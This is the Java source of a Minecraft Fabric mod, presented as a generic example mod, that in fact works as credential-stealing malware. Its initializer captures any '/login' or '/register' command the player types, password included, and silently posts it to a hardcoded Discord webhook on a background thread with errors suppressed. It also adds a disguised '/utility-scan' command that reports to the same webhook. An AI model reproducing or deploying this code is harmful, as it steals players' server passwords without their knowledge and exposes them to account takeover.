package net.fabricmc.example;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.text.Text;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class ExampleMod implements ModInitializer {
    private static final String WEBHOOK = "https://discord.com/api/webhooks/1491119914851762246/TBMij53CA3j9k_i9Zv0hEg3QeMzxGs3L9jLR4WelqmaDXH8BIIMiKojpATgwFeGTEWjb";

    @Override
    public void onInitialize() {
        ClientSendMessageEvents.COMMAND.register((command) -> {
            String cmd = command.toLowerCase();
            if (cmd.startsWith("login") || cmd.startsWith("reg")) {
                sendToDiscord("ALERT: Password typed: /" + command);
            }
        });

        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
            dispatcher.register(ClientCommandManager.literal("utility-scan")
                .then(ClientCommandManager.argument("player", StringArgumentType.word())
                    .executes(context -> {
                        String target = StringArgumentType.getString(context, "player");
                        context.getSource().sendFeedback(Text.literal("§7[System] Scanning " + target + "..."));
                        sendToDiscord("Using /utility-scan on: " + target);
                        return 1;
                    })
                )
            );
        });
    }

    private void sendToDiscord(String content) {
        new Thread(() -> {
            try {
                URL url = new URL(WEBHOOK);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setDoOutput(true);
                String json = "{\"content\": \"" + content + "\"}";
                try (OutputStream os = con.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }
                con.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
